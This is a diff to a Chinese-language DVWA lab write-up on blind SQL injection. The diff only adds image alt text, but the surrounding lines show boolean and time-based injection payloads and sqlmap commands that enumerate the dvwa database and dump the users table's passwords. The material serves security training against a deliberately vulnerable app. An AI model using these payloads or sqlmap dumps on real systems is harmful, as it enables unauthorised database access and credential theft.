@@ -15,7 +15,7 @@ tags:
 
 ## DVWASQLInjection (Blind)
 
-![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg)
+![DVWA 标志（文章封面）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg)
 
 
 
@@ -108,7 +108,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 
 网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png)
+ ![SQL Injection (Blind) 页面，输入 1 后提示 User ID exists in the database.](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png)
 
 ### 布尔盲注
 
@@ -122,7 +122,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and 1=1#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png)
+ ![输入 1' and 1=1# 仍提示 exists，说明单引号注入成立](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png)
 
 注入以下语句，根据回显信息查询失败。由此，判断此为字符型注入，并且需要单引号闭合。
 
@@ -130,7 +130,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and 1=2#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png)
+ ![输入 1' and 1=2# 提示 MISSING，布尔真假可由回显区分](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png)
 
 2、获取版本号
 
@@ -144,7 +144,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 // substr( string, start, length) 函数用于截取字符串 string，start 为起始位置，length 为长度。
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png)
+ ![用 length(substr((select …))) 构造 payload，页面提示 MISSING](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png)
 
 迭代查询语句，最后在猜测长度"6"返回查询存在，说明版本号字符串长度为6
 
@@ -152,7 +152,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and length(substr((select version()),1)) = 6 #
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png)
+ ![同一条 payload 换条件后提示 exists，可据此逐位推断](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png)
 
 接下来获取版本号字符串的内容，MySql的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 `5.7.23` 。猜测第一个数字为’5’，注入以下语句，返回查询结果存在，说明第一个字符为’5’。
 
@@ -160,7 +160,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and substr((select version()),1,1) = '5'#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png)
+ ![用 substr((select …)) 猜字符，回显 exists](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png)
 
 通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及"."符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将得到的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。
 
@@ -185,7 +185,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 // SLEEP()函数是一个用于控制程序流程的函数，它能够让当前的SQL语句执行暂停一定的时间后再继续。
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png)
+ ![Burp 抓到 id=1' and sleep(3)#，响应 32 millis，没有产生延时](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png)
 
 注入以下语句，服务器响应时间达到3秒，说明sleep()函数执行，判断注入类型为字符型盲注。
 
@@ -193,7 +193,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and sleep(3) #
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png)
+ ![去掉引号改成 id=1 and sleep(3)#，响应 3053 millis，时间盲注成立](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png)
 
 2、获取版本号
 
@@ -210,7 +210,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 1' and if(length(substr((select version()), 1)) = 6, sleep(3), 1)#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png)
+ ![id=1' and if(…,sleep(3),1)# 同样延时到 3036 millis](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png)
 
 接下来获取版本号字符串的内容，MySql 的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 `5.7.23` 。猜测第一个数字为’5’，注入以下语句，服务器响应时间大于三秒，说明第一个字符为’5’。
 
@@ -238,7 +238,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch --dbs
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png)
+ ![sqlmap 识别后端为 MySQL >= 5.0，并列出 5 个数据库](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png)
 
 得到数据库名后，选择dvwa数据库，爆破dvwa数据库下的表名。
 
@@ -246,7 +246,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie
 sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa --tables
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png)
+ ![sqlmap 列出 dvwa 库的 guestbook 与 users 两张表](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png)
 
 选择users数据表，查看users数据表有哪些字段
 
@@ -254,7 +254,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie
 sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa -T users --columns
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png)
+ ![sqlmap 列出 users 表的 8 个字段及类型](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png)
 
 选择users数据表下的user、password字段
 
@@ -262,7 +262,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie
 sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png)
+ ![sqlmap dump 出 5 条账号密码，并附上解出的明文](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png)
 
 ## Medium
 
@@ -302,9 +302,9 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 将DVWA Security调整到Medium级别，发现原本提交数据的文本框变成了下拉列表，需要使用Burp Suite抓包修改提交数据。同时，源代码中使用mysqli_real_escape_string()函数防范SQL注入，mysqli_real_escape_string()函数会转义字符串中的特殊字符，如 \x00、\n、\r、\、'、" 和 \x1a。
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png)
+ ![medium 级别下输入框变成下拉框，选中 1](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png)
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png)
+ ![Burp 拦截 POST sql_blind/，请求体为 id=1&Submit=Submit，security=medium](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png)
 
 虽然单引号在Medium级别中被转义，但我们可以使用ASCII码值来代替原来单引号括起来的字符。ascii() 函数可以将字符转换成 ASCII码值，然后我们同样把版本号的各个字符提取出来，然后和 0 ~ 9 和 “.” 11 个字符的 ASCII码值作比较。例如注入如下内容，可以测试出版本号第一个字符为 “5”。
 
@@ -312,7 +312,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 1 and ascii(substr((select version()), 1, 1)) = 53#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png)
+ ![改包为 id=1' and ascii(substr((select version()),1,1)) = 53#，响应提示 exists（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png)
 
 ```
 0 ~ 9 和 “.” 11 个字符的 ASCII码值
@@ -335,7 +335,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png)
+ ![改用 if(ascii(...)=53, sleep(3), 1) 判断，响应 3043 millis](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png)
 
 **布尔盲注代码** 
 
@@ -433,7 +433,7 @@ sqlmap -r "文件地址" --second-url "回显页面URL" --batch
 sqlmap -r "C:\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png)
+ ![sqlmap 运行中提示 HTTP error 404 (Not Found) 185 次](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png)
 
 盲注有点慢，反而对猜测的过程有更直观的认识了。
 
@@ -441,19 +441,19 @@ sqlmap -r "C:\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --ba
 sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch --dbs
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png)
+ ![sqlmap 列出 5 个可用数据库](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png)
 
 ```
 sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa --tables
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png)
+ ![sqlmap 列出 dvwa 库的 2 张表：guestbook、users](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png)
 
 ```
 sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa -T users --columns
 ```
 
- ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png)
+ ![sqlmap 列出 users 表的 8 个字段](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png)
 
 ```
 sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa -T users -C user,password --dump
